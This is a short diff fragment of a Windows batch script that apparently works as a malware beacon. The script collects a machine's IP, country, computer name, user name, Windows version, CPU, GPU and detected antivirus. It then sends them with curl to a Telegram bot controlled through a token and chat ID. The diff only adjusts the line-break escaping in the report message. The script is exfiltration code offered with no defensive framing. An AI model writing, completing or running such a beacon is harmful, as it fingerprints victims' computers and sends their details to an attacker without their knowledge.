@@ -11,7 +11,7 @@ for /f "tokens=2 delims==" %a in ('wmic /namespace:\\root\SecurityCenter2 path A
 if defined ProgramFiles(x86) (set Arch=X64) else (set Arch=X86)
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
-set "MESSAGE=---**RUS**---%%0AIP: !IP!%%0ACountry: !Country!%%0AWorker: !Worker!%%0AUserName: !UserName!%%0AWindows: !Windows! !Arch!%%0ACPU: !CPU!%%0AGPU: !GPU!%%0AAntivirus: !Antivirus!"
+set "MESSAGE=---**RUS**---%0AIP: !IP!%0ACountry: !Country!%0AWorker: !Worker!%0AUserName: !UserName!%0AWindows: !Windows! !Arch!%0ACPU: !CPU!%%0AGPU: !GPU!%0AAntivirus: !Antivirus!"
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=%MESSAGE%"
 endlocal
